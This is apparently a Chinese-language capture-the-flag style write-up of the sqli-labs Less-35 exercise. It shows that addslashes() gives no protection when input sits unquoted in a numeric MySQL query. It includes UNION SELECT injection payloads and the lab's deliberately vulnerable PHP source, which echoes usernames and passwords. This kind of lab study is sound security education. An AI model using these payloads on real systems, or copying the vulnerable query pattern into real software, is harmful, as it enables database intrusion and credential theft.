# Less-35 **GET why care for addslashes()**
TAG：宽字节注入  
## 漏洞利用  
![less35_1](images\less35_1.png)  
根据页面提示参数为整数型，尝试测试回显点的payload:```0 union select 1,2,3#```  
![less35_2](images\less35_2.png)  
成功获取回显点  
  
构造获取数据库名的payload:```0 union select 1,database(),3#```  
![less35_3](images\less35_3.png)  
由此看了似乎```addslashes()```并没有正常起作用  
  
## 源码分析
### less35源代码  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-35 **why care for addslashes()**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="5" color="#00FF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sqli-connect.php");

function check_addslashes($string)
{
    $string = addslashes($string);
    return $string;
}

// take the variables 
if(isset($_GET['id']))
{
$id=check_addslashes($_GET['id']);
//echo "The filtered request is :" .$id . "<br>";

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

mysqli_query($con1, "SET NAMES gbk");
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);

	if($row)
	{
  	echo '<font color= "#00FF00">';	
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysqli_error($con1));
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
        
        

?>
</font> </div></br></br></br><center>
<img src="../images/Less-35.jpg" />
</br>
</br>
</br>
</br>
</br>
<font size='4' color= "#33FFFF">
<?php
echo "Hint: The Query String you input is escaped as : ".$id;
?>
</center>
</font> 
</body>
</html>
```
  
### 漏洞点分析  
```
...
if(isset($_GET['id']))
{
$id=check_addslashes($_GET['id']);
//echo "The filtered request is :" .$id . "<br>";

//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 

mysqli_query($con1, "SET NAMES gbk");
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysqli_query($con1, $sql);
$row = mysqli_fetch_array($result, MYSQLI_BOTH);
...
```
此less的参数类型为整形（数字型查询），函数```addslashes()```没有起到作用  